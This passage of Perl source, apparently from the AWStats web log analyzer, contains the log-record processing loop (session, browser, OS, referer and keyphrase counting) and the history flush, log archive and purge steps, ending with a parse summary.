                        foreach my $pluginname (keys %{$PluginsLoaded{'SectionProcessHostname'}}){
                            my $function = "SectionProcessHostname_$pluginname";
                            &$function($HostResolved);
                        }
                    }
                }
            }

            # Store country
            if($PageBool){
                $_domener_p{$Domain}++;
            }
            if($countedtraffic != 6){
                $_domener_h{$Domain}++;
            }
            if($field[$pos_size] ne '-' && $pos_size>0){
                $_domener_k{$Domain} += int($field[$pos_size]);
            }
            # Analyze: Host, URL entry+exit and Session
            if($PageBool){
                my $timehostl = $_host_l{$HostResolved};
                if($timehostl){
                # A visit for this host was already detected
                # TODO everywhere there is $VISITTIMEOUT
                # $timehostl =~ /^\d\d\d\d\d\d(\d\d)/; my $daytimehostl=$1;
                # if($timerecord > ($timehostl+$VISITTIMEOUT+($dateparts[3]>$daytimehostl?$NEWDAYVISITTIMEOUT:0))){
                    if($timerecord > ($timehostl + $VISITTIMEOUT)){
                        # This is a second visit or more
                        if(!$_waithost_s{$HostResolved }){
                            # This is a second visit or more
                            # We count 'visit','exit','entry','DayVisits'
                            my $timehosts = $_host_s{$HostResolved};
                            my $page      = $_host_u{$HostResolved};
                            if($page){
                                $_url_x{$page }++;
                            }
                            $_url_e{$field[$pos_url]}++;
                            $DayVisits{$yearmonthdayrecord}++;

                            # We can't count session yet because we don't have the start so
                            # we save params of first 'wait' session
                            $_waithost_l{$HostResolved} = $timehostl;
                            $_waithost_s{$HostResolved} = $timehosts;
                            $_waithost_u{$HostResolved} = $page;
                        }else{
                            # This is third visit or more
                            # We count 'session','visit','exit','entry','DayVisits'
                            my $timehosts = $_host_s{$HostResolved};
                            my $page      = $_host_u{$HostResolved};
                            if($page){
                                $_url_x{$page}++;
                            }
                            $_url_e{$field[$pos_url]}++;
                            $DayVisits{$yearmonthdayrecord}++;
                            if($timehosts){
                                $_session{GetSessionRange($timehosts, $timehostl)}++;
                            }
                        }

                        # Save new session properties
                        $_host_s{$HostResolved} = $timerecord;
                        $_host_l{$HostResolved} = $timerecord;
                        $_host_u{$HostResolved} = $field[$pos_url];
                    }elsif($timerecord > $timehostl){
                        # This is a same visit we can count
                        $_host_l{$HostResolved} = $timerecord;
                        $_host_u{$HostResolved} = $field[$pos_url];
                    }elsif($timerecord == $timehostl){
                        # This is a same visit we can count
                        $_host_u{$HostResolved} = $field[$pos_url];
                    }elsif($timerecord < $_host_s{$HostResolved }){
                        # Should happens only with not correctly sorted log files
                        if(!$_waithost_s{$HostResolved}){
                            # We can reorder entry page only if it's the first visit 
                            # found in this update run (The saved entry page was 
                            # $_waithost_e if $_waithost_s{$HostResolved} is not defined.
                            # If second visit or more, entry was directly counted and not saved)
                            $_waithost_e{$HostResolved} = $field[$pos_url];
                        }else{
                             # We can't change entry counted as we dont't 
                             # know what was the url counted as entry
                        }
                        $_host_s{$HostResolved} = $timerecord;
                    }else{
                        # debug
                    }
                }else{
                    # This is a new visit (may be). First new visit found for
                    # this host. We save in wait array the entry page to count later
                    # Save new session properties
                    $_waithost_e{$HostResolved} = $field[$pos_url];
                    $_host_u{$HostResolved} = $field[$pos_url];
                    $_host_s{$HostResolved} = $timerecord;
                    $_host_l{$HostResolved} = $timerecord;
                }
                $_host_p{$HostResolved}++;
            }
            $_host_h{$HostResolved}++;
            if($field[$pos_size] ne '-' && $pos_size>0){
                $_host_k{$HostResolved} += int($field[$pos_size]);
            }

            # Analyze: Browser - OS
            if($pos_agent >= 0){
                if($LevelForBrowsersDetection){
                    # Analyze: Browser
                    my $uabrowser = $TmpBrowser{$UserAgent};
                    if(!$uabrowser){ # Firefox ?
                        my $found = 1;
                        if($UserAgent =~ /$regverfirefox/o && $UserAgent !~ /$regnotfirefox/o){
                            $_browser_h{"firefox"}++;
                            $TmpBrowser{$UserAgent} = "firefox";
                        }elsif($UserAgent =~ /$regveropera/o){ # Opera ?
                            $_browser_h{"opera"}++;
                            $TmpBrowser{$UserAgent} = "opera";
                        }elsif($UserAgent =~ /$regverchrome/o){ # Chrome ?
                            $_browser_h{"chrome"}++;
                            $TmpBrowser{$UserAgent} = "chrome";
                        }elsif($UserAgent =~ /$regversafari/o && $UserAgent !~ /$regnotsafari/o){ # Safari ?
                            my $safariver = $BrowsersSafariBuildToVersionHash{$1};
                            if($UserAgent =~ /$regversafariver/o){
                                $safariver = $1;
                            }
                            $_browser_h{"safari$safariver"}++;
                            $TmpBrowser{$UserAgent} = "safari$safariver";
                        }elsif($UserAgent =~ /$regverkonqueror/o){ # Konqueror ?
                            $_browser_h{"konqueror"}++;
                            $TmpBrowser{$UserAgent} = "konqueror";
                        }elsif($UserAgent =~ /$regversvn/o){ # Subversion ?
                            $_browser_h{"svn"}++;
                            $TmpBrowser{$UserAgent} = "svn";
                        }elsif($UserAgent =~ /$regvermsie/o && $UserAgent !~ /$regnotie/o){
                            # IE ? (must be at end of test)
                            $_browser_h{"msie"}++;
                            $TmpBrowser{$UserAgent} = "msie";
                        }elsif($UserAgent =~ /$regvernetscape/o){
                            # Netscape 6.x, 7.x ... ? (must be at end of test)
                            $_browser_h{"netscape"}++;
                            $TmpBrowser{$UserAgent} = "netscape";
                        }elsif($UserAgent =~ /$regvermozilla/o && $UserAgent !~ /$regnotnetscape/o){
                            # Netscape 3.x, 4.x ... ? (must be at end of test)
                            $_browser_h{"netscape"}++;
                            $TmpBrowser{$UserAgent} = "netscape";
                        }else{
                            # Other known browsers ?
                            $found = 0;
                            foreach (@BrowsersSearchIDOrder){
                                # Search ID in order of BrowsersSearchIDOrder
                                if($UserAgent =~ /$_/){
                                    # TODO If browser is in a family, use version
                                    my $browser = &UnCompileRegex($_);
                                    if($browser){
                                        $_browser_h{"$browser"}++;
                                        $TmpBrowser{$UserAgent} = "$browser";
                                        $found = 1;
                                    }
                                    last;
                                }
                            }
                        }

                        # Unknown browser ?
                        if(!$found){
                            $_browser_h{'Unknown'}++;
                            $TmpBrowser{$UserAgent} = 'Unknown';
                            my $newua = $UserAgent;
                            $newua =~ tr/\+ /__/;
                            $_unknownrefererbrowser_l{$newua} = $timerecord;
                        }
                    }else{
                        $_browser_h{$uabrowser}++;
                        if($uabrowser eq 'Unknown'){
                            my $newua = $UserAgent;
                            $newua =~ tr/\+ /__/;
                            $_unknownrefererbrowser_l{$newua} = $timerecord;
                        }
                    }

                }
                if($LevelForOSDetection){
                    # Analyze: OS
                    my $uaos = $TmpOS{$UserAgent};
                    if(!$uaos){
                        # in OSHashID list ?
                        my $found = 0;
                        foreach (@OSSearchIDOrder){
                            # Search ID in order of OSSearchIDOrder
                            if($UserAgent =~ /$_/){
                                my $osid = $OSHashID{&UnCompileRegex($_)};
                                if($osid){
                                    $_os_h{"$osid"}++;
                                    $TmpOS{$UserAgent} = "$osid";
                                    $found = 1;
                                }
                                last;
                            }
                        }

                        if(!$found){ # Unknown OS ?
                            $_os_h{'Unknown'}++;
                            $TmpOS{$UserAgent} = 'Unknown';
                            my $newua = $UserAgent;
                            $newua =~ tr/\+ /__/;
                            $_unknownreferer_l{$newua} = $timerecord;
                        }
                    }else{
                        $_os_h{$uaos}++;
                        if($uaos eq 'Unknown'){
                            my $newua = $UserAgent;
                            $newua =~ tr/\+ /__/;
                            $_unknownreferer_l{$newua} = $timerecord;
                        }
                    }

                }

            }else{
                $_browser_h{'Unknown'}++;
                $_os_h{'Unknown'}++;
            }

            # Analyze: Referer
            my $found = 0;
            if($pos_referer >= 0 && $LevelForRefererAnalyze && $field[$pos_referer]){
                # Direct ?
                if($field[$pos_referer] eq '-' || $field[$pos_referer] eq 'bookmarks'){
                    # "bookmarks" is sent by Netscape, '-' by all others browsers
                    # Direct access
                    if($PageBool){
                        if($ShowDirectOrigin){
                            print "Direct access for line $line\n";
                        }
                        $_from_p[0]++;
                    }
                    $_from_h[0]++;
                    $found = 1;
                }else{
                    $field[$pos_referer] =~ /$regreferer/o;
                    my $refererprot   = $1;
                    # refererserver is www.xxx.com or www.xxx.com:81 but not www.xxx.com:80
                    # HTML link ?
                    my $refererserver = ($2 || '') . (!$3 || $3 eq ':80' ? '' : $3);
                    if($refererprot =~ /^http/i){
                        # Kind of origin
                        if(!$TmpRefererServer{$refererserver}){
                            # TmpRefererServer{$refererserver} is "=" if same site,
                            # "search egine key" if search engine, not defined otherwise
                            if($refererserver =~ /$reglocal/o){
                                # Intern (This hit came from another page of the site)
                                $TmpRefererServer{$refererserver} = '=';
                                $found = 1;
                            }else{
                                foreach (@HostAliases){
                                    if($refererserver =~ /$_/){
                                        # Intern (This hit came from another page of the site)
                                        $TmpRefererServer{$refererserver} = '=';
                                        $found = 1;
                                        last;
                                    }
                                }
                                if(!$found){
                                    # Extern (This hit came from an external web site).
                                    if($LevelForSearchEnginesDetection){
                                        foreach (@SearchEnginesSearchIDOrder){
                                            # Search ID in order of SearchEnginesSearchIDOrder
                                            if($refererserver =~ /$_/){
                                                my $key = &UnCompileRegex($_);
                                                if(!$NotSearchEnginesKeys{$key} || $refererserver
                                                   !~ /$NotSearchEnginesKeys{$key}/i){
                                                    # This hit came from the search engine $key
                                                    $TmpRefererServer{$refererserver} = $SearchEnginesHashID{$key};
                                                    $found = 1;
                                                }
                                                last;
                                            }
                                        }

                                    }
                                }
                            }
                        }

                        my $tmprefererserver = $TmpRefererServer{$refererserver};
                        if($tmprefererserver){
                            if($tmprefererserver eq '='){
                                # Intern (This hit came from another page of the site)
                                if($PageBool){
                                    $_from_p[4]++;
                                }
                                $_from_h[4]++;
                                $found = 1;
                            }else {
                                # This hit came from a search engine
                                if($PageBool){
                                    $_from_p[2]++;
                                    $_se_referrals_p{$tmprefererserver}++;
                                }
                                $_from_h[2]++;
                                $_se_referrals_h{$tmprefererserver}++;
                                $found = 1;
                                if($PageBool && $LevelForKeywordsDetection){
                                    # we will complete %_keyphrases hash array
                                    # TODO Use \? or [$URLQuerySeparators] ?
                                    my @refurl = split(/\?/, $field[$pos_referer], 2);
                                    if($refurl[1]){
                                        # Extract params of referer query string
                                        # (q=cache:mmm:www/zzz+aaa+bbb q=aaa+bbb/ccc
                                        # key=ddd%20eee lang_en ie=UTF-8 ...)
                                        if($SearchEnginesKnownUrl{$tmprefererserver}){
                                            # Search engine with known URL syntax
                                            foreach my $param (split(/&/, 
                                                $KeyWordsNotSensitive ? lc($refurl[1]) : $refurl[1])){
                                                if($param =~ s/^$SearchEnginesKnownUrl{$tmprefererserver }//){
                                                    # We found good parameter
                                                    # Now param is keyphrase:
                                                    # "cache:mmm:www/zzz+aaa+bbb/ccc+ddd%20eee'fff,ggg"
                                                    # Should be useless since this is for hit on 'not pages'
                                                    # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ]
                                                    # into [ aaa bbb/ccc ddd eee fff ggg]
                                                    $param =~ s/^(cache|related):[^\+]+//;
                                                    &ChangeWordSeparatorsIntoSpace($param); 
                                                    $param =~ s/^ +//;
                                                    $param =~ s/ +$//; # Trim
                                                    $param =~ tr/ /\+/s;
                                                    if((length $param) > 0){
                                                        $_keyphrases{$param}++;
                                                    }
                                                    last;
                                                }
                                            }
                                        }elsif($LevelForKeywordsDetection >= 2){
                                            # Search engine with unknown URL syntax
                                            foreach my $param (split(/&/,
                                                $KeyWordsNotSensitive ? lc($refurl[1]) : $refurl[1])){
                                                my $foundexcludeparam = 0;
                                                foreach my $paramtoexclude(
                                                    @WordsToCleanSearchUrl){
                                                    if($param =~ /$paramtoexclude/i){
                                                        $foundexcludeparam = 1;
                                                        last;
                                                    } # Not the param with search criteria
                                                }
                                                if($foundexcludeparam){
                                                    next;
                                                }

                                                # We found good parameter
                                                # Now param is keyphrase:
                                                # "aaa+bbb/ccc+ddd%20eee'fff,ggg"
                                                # Should be useless since this is for hit on 'not pages'
                                                $param =~ s/.*=//;
                                                $param =~s/^(cache|related):[^\+]+//;
                                                &ChangeWordSeparatorsIntoSpace($param);
                                                # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ]
                                                # into [ aaa bbb/ccc ddd eee fff ggg ]
                                                $param =~ s/^ +//;
                                                $param =~ s/ +$//;     # Trim
                                                $param =~ tr/ /\+/s;
                                                if((length $param) > 2){
                                                    $_keyphrases{$param}++;
                                                    last;
                                                }
                                            }
                                        }
                                    }# End of elsif refurl[1]
                                    elsif($SearchEnginesWithKeysNotInQuery{$tmprefererserver }){
                                        # If search engine with key inside page url
                                        # like a9 (www.a9.com/searchkey1%20searchkey2)
                                        if($refurl[0] =~ /$SearchEnginesKnownUrl{$tmprefererserver }(.*)$/){
                                            my $param = $1;
                                            &ChangeWordSeparatorsIntoSpace($param);
                                            $param =~ tr/ /\+/s;
                                            if((length $param) > 0){
                                                $_keyphrases{$param}++;
                                            }
                                        }
                                    }

                                }
                            }
                        } # End of if($TmpRefererServer)
                        else{
                            # This hit came from a site other than a search engine
                            if($PageBool){
                                $_from_p[3]++;
                            }
                            $_from_h[3]++;

                            # http://www.mysite.com/ must be same referer than
                            # http://www.mysite.com but .../mypage/ differs of .../mypage
                            # if($refurl[0] =~ /^[^\/]+\/$/){
                            #    $field[$pos_referer] =~ s/\/$//;
                            # } # Code moved in Save_History
                            # TODO: lowercase the value for referer server
                            # to have refering server not case sensitive
                            if($URLReferrerWithQuery){
                                if($PageBool){
                                    $_pagesrefs_p{$field[$pos_referer]}++;
                                }
                                $_pagesrefs_h{$field[$pos_referer]}++;
                            }else{
                                # We discard query for referer
                                if($field[$pos_referer] =~ /$regreferernoquery/o){
                                    if($PageBool){
                                        $_pagesrefs_p{"$1"}++;
                                    }
                                    $_pagesrefs_h{"$1"}++;
                                }else{
                                    if($PageBool){
                                        $_pagesrefs_p{$field[$pos_referer]}++;
                                    }
                                    $_pagesrefs_h{$field[$pos_referer]}++;
                                }
                            }
                            $found = 1;
                        }
                    }

                    # News Link ?
                    # if(!$found && $refererprot =~ /^news/i){
                    #    $found=1;
                    #    if($PageBool){
                    #        $_from_p[5]++;
                    #    }
                    #    $_from_h[5]++;
                    # }
                }
            }

            # Origin not found
            if(!$found){
                if($ShowUnknownOrigin){
                    print "Unknown origin: $field[$pos_referer]\n";
                }
                if($PageBool){
                    $_from_p[1]++;
                }
                $_from_h[1]++;
            }

            # Analyze: EMail
            if($pos_emails >= 0 && $field[$pos_emails]){
                if($field[$pos_emails] eq '<>'){
                    $field[$pos_emails] = 'Unknown';
                }elsif($field[$pos_emails] !~ /\@/){
                    $field[$pos_emails] .= "\@$SiteDomain";
                }
                
                #Count accesses for sender email (hit)
                $_emails_h{lc($field[$pos_emails])}++;
                if($pos_size>0){
                    $_emails_k{lc($field[$pos_emails])} += int($field[$pos_size]);
                } #Count accesses for sender email (kb)
                $_emails_l{lc($field[$pos_emails])} = $timerecord;
            }
            if($pos_emailr >= 0 && $field[$pos_emailr]){
                if($field[$pos_emailr] !~ /\@/){
                    $field[$pos_emailr] .= "\@$SiteDomain";
                }
                #Count accesses for receiver email (hit)
                #Count accesses for receiver email (kb)
                $_emailr_h{lc($field[$pos_emailr])}++;
                if($pos_size>0){
                    $_emailr_k{ lc($field[$pos_emailr])} += int($field[$pos_size]);
                }
                $_emailr_l{lc($field[$pos_emailr])} = $timerecord;
            }
        }

        # count agent times: -,miss,hit;
        my $web_agent = $field[$pos_web];
        if($web_agent){
            $web_agent =~ tr/[A-Z]/[a-z]/;
            $_webagent_hits{$web_agent}++;
            $_webagent_bandwith{$web_agent} += $field[$pos_size];
        }
    
        # Check cluster
        if($pos_cluster >= 0){
            if($PageBool){
                $_cluster_p{$field[$pos_cluster]}++;
            } #Count accesses for page (page)
            #Count accesses for page (hit)
            $_cluster_h{$field[$pos_cluster]}++;
            if($pos_size>0){
                $_cluster_k{$field[$pos_cluster]} += int($field[$pos_size]);
            } #Count accesses for page (kb)
        }

        # Analyze: Extra
        foreach my $extranum (1 .. @ExtraName - 1){
            # Check code
            my $conditionok = 0;
            if($ExtraCodeFilter[$extranum]){
                foreach my $condnum (0 .. @{$ExtraCodeFilter[$extranum]} - 1){
                    if($field[$pos_code] eq "$ExtraCodeFilter[$extranum][$condnum]"){
                        $conditionok = 1;
                        last;
                    }
                }
                if(!$conditionok && @{ $ExtraCodeFilter[$extranum]}){
                    next;
                } # End for this section
            }

            # Check conditions
            $conditionok = 0;
            foreach my $condnum (0 .. @{ $ExtraConditionType[$extranum]} - 1){
                my $conditiontype    = $ExtraConditionType[$extranum][$condnum];
                my $conditiontypeval = $ExtraConditionTypeVal[$extranum][$condnum];
                if($conditiontype eq 'URL'){
                    if($urlwithnoquery =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }elsif($conditiontype eq 'QUERY_STRING'){
                    if($standalonequery =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }elsif($conditiontype eq 'URLWITHQUERY'){
                    if("$urlwithnoquery$tokenquery$standalonequery" =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }elsif($conditiontype eq 'REFERER'){
                    if($field[$pos_referer] =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }elsif($conditiontype eq 'UA'){
                    if($field[$pos_agent] =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }elsif($conditiontype eq 'HOSTINLOG'){
                    if($field[$pos_host] =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }elsif($conditiontype eq 'HOST'){
                    my $hosttouse = ($HostResolved ? $HostResolved : $Host);
                    if($hosttouse =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }elsif($conditiontype eq 'VHOST'){
                    if($field[$pos_vh] =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }elsif($conditiontype =~ /extra(\d+)/i){
                    if($field[ $pos_extra[$1]] =~ /$conditiontypeval/){
                        $conditionok = 1;
                        last;
                    }
                }else {
                    error("Wrong value of parameter ExtraSectionCondition$extranum");
                }
            }
            if(!$conditionok && @{$ExtraConditionType[$extranum]}){
                next;
            } # End for this section

            # Determine actual column value to use.
            my $rowkeyval;
            my $rowkeyok = 0;
            foreach my $rowkeynum (0 .. @{ $ExtraFirstColumnValuesType[$extranum]} - 1){
                my $rowkeytype = $ExtraFirstColumnValuesType[$extranum][$rowkeynum];
                my $rowkeytypeval = $ExtraFirstColumnValuesTypeVal[$extranum][$rowkeynum];
                if($rowkeytype eq 'URL'){
                    if($urlwithnoquery =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }elsif($rowkeytype eq 'QUERY_STRING'){
                    if($standalonequery =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }elsif($rowkeytype eq 'URLWITHQUERY'){
                    if("$urlwithnoquery$tokenquery$standalonequery" =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }elsif($rowkeytype eq 'REFERER'){
                    if($field[$pos_referer] =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }elsif($rowkeytype eq 'UA'){
                    if($field[$pos_agent] =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }elsif($rowkeytype eq 'HOSTINLOG'){
                    if($field[$pos_host] =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }elsif($rowkeytype eq 'HOST'){
                    my $hosttouse = ($HostResolved ? $HostResolved : $Host);
                    if($hosttouse =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }elsif($rowkeytype eq 'VHOST'){
                    if($field[$pos_vh] =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }elsif($rowkeytype =~ /extra(\d+)/i){
                    if($field[ $pos_extra[$1] ] =~ /$rowkeytypeval/){
                        $rowkeyval = "$1";
                        $rowkeyok  = 1;
                        last;
                    }
                }else {
                    error("Wrong value of parameter ExtraSectionFirstColumnValues$extranum");
                }
            }
            if(!$rowkeyok){
                next;
            } # End for this section
            if(!$rowkeyval){
                $rowkeyval = 'Failed to extract key';
            }

            # Apply function on $rowkeyval
            if($ExtraFirstColumnFunction[$extranum]){
                # Todo call function on string $rowkeyval
            }
            # Here we got all values to increase counters
            if($PageBool && $ExtraStatTypes[$extranum] =~ /P/i){
                ${'_section_' . $extranum . '_p'}{$rowkeyval }++;
            }
            ${'_section_' . $extranum . '_h'}{$rowkeyval }++; # Must be set
            if($ExtraStatTypes[$extranum] =~ /B/i && $pos_size>0){
                ${'_section_' . $extranum . '_k'}{$rowkeyval} += int($field[$pos_size]);
            }
            if($ExtraStatTypes[$extranum] =~ /L/i){
                if(${'_section_' . $extranum . '_l'}{$rowkeyval} || 0 < $timerecord){
                    ${'_section_' . $extranum . '_l'}{$rowkeyval } = $timerecord;
                }
            }

            # Check to avoid too large extra sections
            if(scalar keys %{'_section_' . $extranum . '_h'} >$ExtraTrackedRowsLimit){
                error(<<END_ERROR_TEXT);
The number of values found for extra section $extranum has grown too large.
In order to prevent awstats from using an excessive amount of memory, the number
of values is currently limited to $ExtraTrackedRowsLimit. Perhaps you should consider
revising extract parameters for extra section $extranum. If you are certain you
want to track such a large data set, you can increase the limit by setting
ExtraTrackedRowsLimit in your awstats configuration file.
END_ERROR_TEXT
            }
        }

        # Every 20,000 approved lines after a flush, we test to
        # clean too large hash arrays to flush data in tmp file
        if(++$counterforflushtest >= 20000){
            #if(++$counterforflushtest >= 1) {
            if((scalar keys %_host_u) > ($LIMITFLUSH << 2) || (scalar keys %_url_p) > $LIMITFLUSH){
                # warning("Warning: Try to run AWStats update process
                # more frequently to analyze smaler log files.");
                if($^X =~ /activestate/i || $^X =~ /activeperl/i){
                    # We don't flush if perl is activestate to avoid
                    # slowing process because of memory hole
                }else{
                    # Clean tmp hash arrays
                    #%TmpDNSLookup = ();
                    %TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();
                    # We flush if perl is not activestate
                    print "Flush history file on disk";
                    if((scalar keys %_host_u) > ($LIMITFLUSH << 2)){
                        print " (unique hosts reach flush limit of " . ($LIMITFLUSH << 2) . ")";
                    }
                    if((scalar keys %_url_p) > $LIMITFLUSH){
                        print " (unique url reach flush limit of " . ($LIMITFLUSH) . ")";
                    }
                    print "\n";

                    &Read_History_With_TmpUpdate(
                        $lastprocessedyear, $lastprocessedmonth,
                        $lastprocessedday,  $lastprocessedhour, 1, 1,
                        "all", ($lastlinenb + $NbOfLinesParsed),
                        $lastlineoffset, &CheckSum($_));
                    &GetDelaySinceStart(1);
                    $NbOfLinesShowsteps = 1;
                }
            }
            $counterforflushtest = 0;
        }
    } # End of loop for processing new record.

    # Save current processed break section
    # If lastprocesseddate > 0 means there is at least one approved
    # new record in log or at least one existing history file
    if($lastprocesseddate > 0){
        # TODO: Do not save if we are sure a flush was just already done
        # Get last line
        seek(LOG, $lastlineoffset, 0);
        my $line = <LOG>;
        chomp $line;
        $line =~ s/\r$//;
        #if(!$NbOfLinesParsed){
        #    # TODO If there was no lines parsed (log was empty),
        #    # we only update LastUpdate line with YYYYMMDDHHMMSS 0 0 0 0 0
        #    &Read_History_With_TmpUpdate($lastprocessedyear, $lastprocessedmonth,
        #                                 $lastprocessedday, $lastprocessedhour, 1, 1,
        #                                 "all", ($lastlinenb + $NbOfLinesParsed),
        #                                 $lastlineoffset, &CheckSum($line));
        #}else{
            &Read_History_With_TmpUpdate($lastprocessedyear, $lastprocessedmonth,
                                         $lastprocessedday, $lastprocessedhour, 1, 1,
                                         "all", ($lastlinenb + $NbOfLinesParsed),
                                         $lastlineoffset, &CheckSum($line));
        #}
    }
    close LOG || error("Command for pipe '$LogFile' failed");

    # Process the Rename - Archive - Purge phase
    # Open Log file for writing if PurgeLogFile is on
    my $renameok  = 1;
    my $archiveok = 1;
    if($PurgeLogFile){
        if($ArchiveLogRecords){
            if($ArchiveLogRecords == 1){ # For backward compatibility
                $ArchiveFileName = "$DirData/${PROG }_archive$FileSuffix.log";
            }else{
                $ArchiveFileName = "$DirData/${PROG }_archive$FileSuffix." . 
                                   &Substitute_Tags($ArchiveLogRecords) . ".log";
            }
            open(LOG, "+<$LogFile") 
                || error("Enable to archive log records of \"$LogFile\" ".
                         "into \"$ArchiveFileName\" because source can't ".
                         "be opened for read and write: $!<br />\n");
        }else{
            open(LOG, "+<$LogFile");
        }
        binmode LOG;
    }

    # Rename all HISTORYTMP files into HISTORYTXT
    # Purge Log file if option is on and all renaming are ok
    &Rename_All_Tmp_History();
    if($PurgeLogFile){
        # Archive LOG file into ARCHIVELOG
        if($ArchiveLogRecords){
            open(ARCHIVELOG, ">>$ArchiveFileName")
                || error("Couldn't open file \"$ArchiveFileName\" to archive log: $!");
            binmode ARCHIVELOG;
            while(<LOG>){
                if(!print ARCHIVELOG $_){
                    $archiveok = 0; last;
                }
            }
            close(ARCHIVELOG)
                || error("Archiving failed during closing archive: $!");
            if($SaveDatabaseFilesWithPermissionsForEveryone){
                chmod 0666, "$ArchiveFileName";
            }
        }

        # If rename and archive ok
        if($renameok && $archiveok){
            my $bold   = ($ENV{'GATEWAY_INTERFACE' } ? '<b>'    : '');
            my $unbold = ($ENV{'GATEWAY_INTERFACE' } ? '</b>'   : '');
            my $br     = ($ENV{'GATEWAY_INTERFACE' } ? '<br />' : '');
            truncate(LOG, 0)
                || warning("Warning: $bold$PROG$unbold couldn't purge logfile ".
                           "\"$bold$LogFile$unbold\".$br\nChange your logfile ".
                           "permissions to allow write for your web server CGI ".
                           "process or change PurgeLogFile=1 into PurgeLogFile=0 ".
                           "in configure file and think to purge sometimes manually ".
                           "your logfile (just after running an update process to ".
                           "not loose any not already processed records your log file contains).");
        }
        close(LOG);
    }

    if($DNSLookup == 1 && $NbOfNewLines){
        # DNSLookup warning
        my $bold   = ($ENV{'GATEWAY_INTERFACE' } ? '<b>'    : '');
        my $unbold = ($ENV{'GATEWAY_INTERFACE' } ? '</b>'   : '');
        my $br     = ($ENV{'GATEWAY_INTERFACE' } ? '<br />' : '');
        warning("Warning: $bold$PROG$unbold has detected that some ".
                "hosts names were already resolved in your logfile ".
                "$bold$DNSLookupAlreadyDone$unbold.$br\nIf DNS lookup ".
                "was already made by the logger (web server), you should ".
                "change your setup DNSLookup=$DNSLookup into DNSLookup=0 ".
                "to increase $PROG speed.");
    }
    if($DNSLookup == 1 && $NbOfNewLines){
        # Save new DNS last update cache file
        # Save into file using FileSuffix
        Save_DNS_Cache_File(\%TmpDNSLookup, "$DirData/$DNSLastUpdateCacheFile", "$FileSuffix");
    }
    if($EnableLockForUpdate){
        # Remove lock
        # Restore signals handler
        &Lock_Update(0);
        $SIG{INT } = 'DEFAULT';   # 2
        #$SIG{KILL } = 'DEFAULT'; # 9
        #$SIG{TERM } = 'DEFAULT'; # 15
    }

}
# End of log processing if($UPdateStats)

#---------------------------------------------------------------------
# SHOW REPORT
#---------------------------------------------------------------------
print "Jumped lines in file: $lastlinenb\n";
if($lastlinenb){
    print " Found $lastlinenb already parsed records.\n";
 }
print "Parsed lines in file: $NbOfLinesParsed\n";
print "  Found $NbOfLinesDropped dropped records,\n";
print "  Found $NbOfLinesComment comments,\n";
print "  Found $NbOfLinesBlank blank records,\n";
print "  Found $NbOfLinesCorrupted corrupted records,\n";
print "  Found $lastlinenb old records,\n";
print "  Found $NbOfNewLines new qualified records.\n";

0;    # Do not remove this line

